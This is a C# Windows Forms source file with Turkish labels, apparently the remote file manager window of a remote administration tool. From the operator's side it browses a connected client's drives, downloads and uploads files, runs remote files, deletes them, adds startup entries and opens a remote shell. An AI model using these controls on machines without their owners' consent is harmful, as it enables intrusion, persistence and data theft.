using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Enumlar2;
using xServer.Kontroller;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Eylemler;
using xServer.KuuhakuCekirdek.UTIlityler;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;

namespace xServer.Formlar
{
    public partial class FrmDosyaYöneticisi : Form
    {
        private string _currentDir;
        private readonly Client _connectClient;
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);
        public Dictionary<int, string> CanceledUploads = new Dictionary<int, string>();

        private const int TRANSFER_ID = 0;
        private const int TRANSFER_TYPE = 1;
        private const int TRANSFER_STATUS = 2;

        public FrmDosyaYöneticisi(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmFm = this;
            InitializeComponent();
        }

        private string GetAbsolutePath(string item)
        {
            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = PencereYardımcısı.GetWindowTitle("Dosya Yöneticisi", _connectClient);
                new KuuhakuCekirdek.Paketler.ServerPaketleri.GetDrives().Execute(_connectClient);
            }
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmFm = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_connectClient != null && _connectClient.Value != null)
            {
                SetCurrentDir(cmbDrives.SelectedValue.ToString());
                RefreshDirectory();
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_connectClient != null && _connectClient.Value != null && lstDirectory.SelectedItems.Count > 0)
            {
                DizinTürleri type = (DizinTürleri)lstDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case DizinTürleri.Geri:
                        SetCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                        RefreshDirectory();
                        break;
                    case DizinTürleri.Klasör:
                        SetCurrentDir(GetAbsolutePath(lstDirectory.SelectedItems[0].SubItems[0].Text));
                        RefreshDirectory();
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                DizinTürleri type = (DizinTürleri)files.Tag;

                if (type == DizinTürleri.Dosya)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    int id = DosyaYardımcısı.GetNewTransferId(files.Index);

                    if (_connectClient != null)
                    {
                        new KuuhakuCekirdek.Paketler.ServerPaketleri.DoDownloadFile(path, id).Execute(_connectClient);

                        AddTransfer(id, "İndir", "Bekleniyor...", files.SubItems[0].Text);
                    }
                }
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Yüklenicek dosyaları seçiniz";
                ofd.Filter = "Bütün Dosyalar (*.*)|*.*";
                ofd.Multiselect = true;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    var remoteDir = _currentDir;
                    foreach (var filePath in ofd.FileNames)
                    {
                        if (!File.Exists(filePath)) continue;

                        string path = filePath;
                        new Thread(() =>
                        {
                            int id = DosyaYardımcısı.GetNewTransferId();

                            if (string.IsNullOrEmpty(path)) return;

                            AddTransfer(id, "Upload", "Pending...", Path.GetFileName(path));

                            int index = GetTransferIndex(id);
                            if (index < 0)
                                return;

                            FileSplit srcFile = new FileSplit(path);
                            if (srcFile.MaxBlocks < 0)
                            {
                                UpdateTransferStatus(index, "Dosya Okuma Hatası", 0);
                                return;
                            }

                            string remotePath = Path.Combine(remoteDir, Path.GetFileName(path));

                            if (string.IsNullOrEmpty(remotePath)) return;

                            _limitThreads.WaitOne();
                            for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                            {
                                if (_connectClient.Value == null || _connectClient.Value.FrmFm == null)
                                {
                                    _limitThreads.Release();
                                    return;
                                }

                                if (CanceledUploads.ContainsKey(id))
                                {
                                    UpdateTransferStatus(index, "İptal Edildi", 0);
                                    _limitThreads.Release();
                                    return;
                                }

                                index = GetTransferIndex(id);
                                if (index < 0)
                                {
                                    _limitThreads.Release();
                                    return;
                                }

                                decimal progress =
                                    Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);

                                UpdateTransferStatus(index, string.Format("Yükleniyor...({0}%)", progress), -1);

                                byte[] block;
                                if (srcFile.ReadBlock(currentBlock, out block))
                                {
                                    new KuuhakuCekirdek.Paketler.ServerPaketleri.DoUploadFile(id,
                                        remotePath, block, srcFile.MaxBlocks,
                                        currentBlock).Execute(_connectClient);
                                }
                                else
                                {
                                    UpdateTransferStatus(index, "Dosya Okuma Hatası", 0);
                                    _limitThreads.Release();
                                    return;
                                }
                            }
                            _limitThreads.Release();

                            if (remoteDir == _currentDir)
                                RefreshDirectory();

                            UpdateTransferStatus(index, "Tamamlandı", 1);
                        }).Start();
                    }
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                DizinTürleri type = (DizinTürleri)files.Tag;

                if (type == DizinTürleri.Dosya)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    if (_connectClient != null)
                        new KuuhakuCekirdek.Paketler.ServerPaketleri.DoProcessStart(path).Execute(_connectClient);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                DizinTürleri type = (DizinTürleri)files.Tag;

                switch (type)
                {
                    case DizinTürleri.Klasör:
                    case DizinTürleri.Dosya:
                        string path = GetAbsolutePath(files.SubItems[0].Text);
                        string newName = files.SubItems[0].Text;

                        if (InputBox.Show("Yeni isim", "Yeni isim giriniz:", ref newName) == DialogResult.OK)
                        {
                            newName = GetAbsolutePath(newName);

                            if (_connectClient != null)
                                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoPathRename(path, newName, type).Execute(_connectClient);
                        }
                        break;
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = lstDirectory.SelectedItems.Count;
            if (count == 0) return;
            if (MessageBox.Show(string.Format("Bu dosyaları silmek istediğinizden emin misiniz {0} dosya(lar)?", count),
                "Silme Onayı", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (ListViewItem files in lstDirectory.SelectedItems)
                {
                    DizinTürleri type = (DizinTürleri)files.Tag;

                    switch (type)
                    {
                        case DizinTürleri.Klasör:
                        case DizinTürleri.Dosya:
                            string path = GetAbsolutePath(files.SubItems[0].Text);
                            if (_connectClient != null)
                                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoPathDelete(path, type).Execute(_connectClient);
                            break;
                    }
                }
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                DizinTürleri type = (DizinTürleri)files.Tag;

                if (type == DizinTürleri.Dosya)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    using (var frm = new FrmBaşlangıcaEkle(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            if (_connectClient != null)
                                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoStartupItemAdd(Başlangıçİtemleri.Name, Başlangıçİtemleri.Path,
                                    Başlangıçİtemleri.Type).Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                string path = _currentDir;
                if (lstDirectory.SelectedItems.Count == 1)
                {
                    var item = lstDirectory.SelectedItems[0];
                    DizinTürleri type = (DizinTürleri)item.Tag;

                    if (type == DizinTürleri.Klasör)
                    {
                        path = GetAbsolutePath(item.SubItems[0].Text);
                    }
                }

                if (_connectClient.Value.FrmRs != null)
                {
                    new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                    _connectClient.Value.FrmRs.Focus();
                }
                else
                {
                    FrmUzakKabuk frmRS = new FrmUzakKabuk(_connectClient);
                    frmRS.Show();
                    new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                }
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);

            Process.Start(_connectClient.Value.DownloadDirectory);
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("İndiriliyor") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Yükleniyor") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Bekleniyor")) continue;

                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                if (transfer.SubItems[TRANSFER_TYPE].Text == "İndir")
                {
                    if (_connectClient != null)
                        new KuuhakuCekirdek.Paketler.ServerPaketleri.DoDownloadFileCancel(id).Execute(_connectClient);
                    if (!Eylemİşleyicisi.CanceledDownloads.ContainsKey(id))
                        Eylemİşleyicisi.CanceledDownloads.Add(id, "canceled");
                    if (Eylemİşleyicisi.RenamedFiles.ContainsKey(id))
                        Eylemİşleyicisi.RenamedFiles.Remove(id);
                    UpdateTransferStatus(transfer.Index, "İptal Edildi", 0);
                }
                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Yükle")
                {
                    if (!CanceledUploads.ContainsKey(id))
                        CanceledUploads.Add(id, "canceled");
                    UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.Items)
            {
                if (transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("İndiriliyor") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Yükleniyor") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Bekleniyor")) continue;
                transfer.Remove();
            }
        }

        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
        }

        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                var remoteDir = _currentDir;
                foreach (string filePath in files)
                {
                    if (!File.Exists(filePath)) continue;

                    string path = filePath;
                    new Thread(() =>
                    {
                        int id = DosyaYardımcısı.GetNewTransferId();

                        if (string.IsNullOrEmpty(path)) return;

                        AddTransfer(id, "Upload", "Pending...", Path.GetFileName(path));

                        int index = GetTransferIndex(id);
                        if (index < 0)
                            return;

                        FileSplit srcFile = new FileSplit(path);
                        if (srcFile.MaxBlocks < 0)
                        {
                            UpdateTransferStatus(index, "Dosya Okuma Hatası", 0);
                            return;
                        }

                        string remotePath = Path.Combine(remoteDir, Path.GetFileName(path));

                        if (string.IsNullOrEmpty(remotePath)) return;

                        _limitThreads.WaitOne();
                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            if (_connectClient.Value == null || _connectClient.Value.FrmFm == null)
                            {
                                _limitThreads.Release();
                                return;
                            }

                            if (CanceledUploads.ContainsKey(id))
                            {
                                UpdateTransferStatus(index, "İptal Edildi", 0);
                                _limitThreads.Release();
                                return;
                            }

                            index = GetTransferIndex(id);
                            if (index < 0)
                            {
                                _limitThreads.Release();
                                return;
                            }

                            decimal progress =
                                Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);

                            UpdateTransferStatus(index, string.Format("Yükleniyor...({0}%)", progress), -1);

                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoUploadFile(id,
                                    remotePath, block, srcFile.MaxBlocks,
                                    currentBlock).Execute(_connectClient);
                            }
                            else
                            {
                                UpdateTransferStatus(index, "Dosya Okuma Hatası", 0);
                                _limitThreads.Release();
                                return;
                            }
                        }
                        _limitThreads.Release();

                        if (remoteDir == _currentDir)
                            RefreshDirectory();

                        UpdateTransferStatus(index, "Tamamlandı", 1);
                    }).Start();
                }
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
            {
                RefreshDirectory();
                e.Handled = true;
            }
        }

        public void AddDrives(RemoteDrive[] drives)
        {
            try
            {
                cmbDrives.Invoke((MethodInvoker)delegate
                {
                    cmbDrives.DisplayMember = "DisplayName";
                    cmbDrives.ValueMember = "RootDirectory";
                    cmbDrives.DataSource = new BindingSource(drives, null);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void ClearFileBrowser()
        {
            try
            {
                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddItemToFileBrowser(string name, string size, DizinTürleri type, int imageIndex)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != DizinTürleri.Geri) ? type.ToString() : string.Empty })
                {
                    Tag = type,
                    ImageIndex = imageIndex
                };

                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddTransfer(int id, string type, string status, string filename)
        {
            try
            {
                ListViewItem lvi =
                    new ListViewItem(new string[] { id.ToString(), type, status, filename });

                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstTransfers.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public int GetTransferIndex(int id)
        {
            string strId = id.ToString();
            int index = 0;

            try
            {
                lstTransfers.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[TRANSFER_ID].Text)))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        public void UpdateTransferStatus(int index, string status, int imageIndex)
        {
            try
            {
                lstTransfers.Invoke((MethodInvoker)delegate
                {
                    lstTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    if (imageIndex >= 0)
                        lstTransfers.Items[index].ImageIndex = imageIndex;
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        public void SetCurrentDir(string path)
        {
            _currentDir = path;
            try
            {
                txtPath.Invoke((MethodInvoker)delegate
                {
                    txtPath.Text = _currentDir;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void SetStatus(string text, bool setLastDirectorySeen = false)
        {
            try
            {
                if (_connectClient.Value != null && setLastDirectorySeen)
                {
                    SetCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                    _connectClient.Value.ReceivedLastDirectory = true;
                }
                statusStrip.Invoke((MethodInvoker)delegate
                {
                    stripLblStatus.Text = "Durum: " + text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void RefreshDirectory()
        {
            if (_connectClient == null || _connectClient.Value == null) return;

            if (!_connectClient.Value.ReceivedLastDirectory)
                _connectClient.Value.ProcessingDirectory = false;

            new KuuhakuCekirdek.Paketler.ServerPaketleri.GetDirectory(_currentDir).Execute(_connectClient);
            SetStatus("Klasör İçerikleri Yükleniyor...");
            _connectClient.Value.ReceivedLastDirectory = false;
        }
    }
}